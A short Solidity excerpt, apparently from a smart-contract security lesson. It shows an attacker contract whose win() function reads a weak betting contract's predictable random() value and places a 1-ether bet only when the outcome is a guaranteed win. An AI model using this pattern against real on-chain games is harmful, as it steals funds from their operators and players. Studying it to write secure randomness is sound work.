BadRandomBetContract private bet_;

function win() public payable onlyOwner {
        uint8 rnd = bet_.random();         

        require(rnd % 2 == 1);             
        require(msg.value == 1 ether);

        bet_.bet.value(msg.value)();       

        require(getBalance() == 2 ether);  
    }

function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
